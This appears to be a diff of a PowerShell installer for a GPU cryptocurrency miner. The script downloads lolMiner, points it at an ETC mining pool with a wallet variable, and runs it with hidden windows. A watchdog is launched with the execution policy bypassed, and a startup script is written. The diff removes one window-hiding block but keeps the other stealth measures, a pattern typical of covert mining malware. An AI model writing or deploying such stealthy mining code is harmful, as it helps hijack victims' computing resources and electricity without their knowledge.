@@ -28,24 +28,23 @@ function Install-Miner {
     New-Item -ItemType Directory -Force -Path $MINER_DIR | Out-Null
     
     Write-Log "Downloading lolMiner..."
-    $lolMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97a/lolMiner_v1.97a_Win64.zip"
+    $lolMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip"
     $lolMinerZip = "$MINER_DIR\lolminer.zip"
     Invoke-WebRequest -Uri $lolMinerUrl -OutFile $lolMinerZip
     Expand-Archive -Path $lolMinerZip -DestinationPath "$MINER_DIR\lolminer" -Force
     
     $gpuConfig = @"
 {
-    "algo": "etchash",
-    "servers": [
+    "algo" : "ETCHASH",
+    "servers" : [
         {
-            "url": "etc.2miners.com:1010",
-            "user": "$WALLET_ETC",
-            "pass": "x"
+            "url" : "etc.2miners.com:1010",
+            "user" : "$WALLET_ETC",
+            "pass" : "x"
         }
     ],
-    "watch": true,
-    "api": {
-        "report-interval": 30
+    "api" : {
+        "report-interval" : 30
     }
 }
 "@
@@ -85,19 +84,7 @@ while (`$true) {
     $watchdogContent | Out-File -FilePath $WATCHDOG_SCRIPT -Encoding UTF8
     
     $startupScript = @"
-`$hwnd = (Get-Process -Id $PID).MainWindowHandle
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Win32 {
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    }
-"@
-[Win32]::ShowWindow(`$hwnd, 0)
-
-Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
-
+Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--algo","ETCHASH","--pool","etc.2miners.com:1010","--user","$WALLET_ETC","--pass","x" -WindowStyle Hidden
 Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
 "@
     $startupScript | Out-File -FilePath "$MINER_DIR\start.ps1" -Encoding UTF8
@@ -120,7 +107,7 @@ Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hid
 
 function Start-Miner {
     Write-Log "Starting GPU miner..."
-    Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
+    Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--algo","ETCHASH","--pool","etc.2miners.com:1010","--user","$WALLET_ETC","--pass","x" -WindowStyle Hidden
     Write-Log "GPU miner started"
     
     Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
